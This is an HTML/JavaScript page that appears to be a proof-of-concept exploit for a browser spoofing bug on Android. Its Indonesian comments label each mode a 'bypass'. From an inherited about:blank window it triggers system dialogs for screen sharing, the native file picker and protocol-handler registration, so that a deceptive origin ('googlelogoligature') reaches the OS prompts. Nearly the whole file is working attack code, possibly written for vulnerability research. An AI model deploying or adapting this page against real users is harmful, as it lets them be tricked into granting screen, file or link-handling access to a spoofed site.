<!doctype html>
<html>
<head>
<style>html { font-family: sans-serif; background: transparent; }</style>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<script>
var searchParams = new URLSearchParams(window.location.search);
var mode = searchParams.get('mode');

const clickAgainInstructions = '<meta name="viewport" content="width=device-width, initial-scale=1"><style>html { font-family: sans-serif; text-align:center; padding-top: 20vh; }</style><h2>Tap screen to trigger Native API</h2>';

window.addEventListener('click', () => {
    // Trik "about:blank" inheritance dari Alesandro tetep dipakai!
    var newWin = window.open('about:blank');
    
    setTimeout(() => {
        switch (mode) {
            case 'screenshare':
                // BYPASS 1: MediaProjection System Dialog (Screen Recording)
                // Berbeda dengan getUserMedia (Kamera), ini memanggil UI OS Android!
                newWin.addEventListener('click', async () => {
                    try {
                        await newWin.navigator.mediaDevices.getDisplayMedia({video: true});
                    } catch (e) { console.log(e); }
                });
                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System Screen Share UI</p>";
                break;

            case 'filesystem':
                // BYPASS 2: Native Android File Picker
                // Origin (googlelogoligature) akan dikirim ke OS File Manager
                newWin.addEventListener('click', async () => {
                    try {
                        await newWin.showOpenFilePicker({
                            types: [{ description: 'Images', accept: {'image/*': ['.png', '.gif', '.jpeg', '.jpg']} }]
                        });
                    } catch (e) { console.log(e); }
                });
                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: System File Picker UI</p>";
                break;

            case 'protocol':
                // BYPASS 3: Register Protocol Handler
                // Memanggil popup instalasi handler yang punya class UI berbeda
                newWin.addEventListener('click', () => {
                    try {
                        newWin.navigator.registerProtocolHandler("web+secure", "https://googlelogoligature.com/?q=%s", "Secure Handler");
                    } catch (e) { console.log(e); }
                });
                newWin.document.body.innerHTML = clickAgainInstructions + "<p>Target: Protocol Handler UI</p>";
                break;
        }
    }, 150);
});
</script>
</body>
</html>
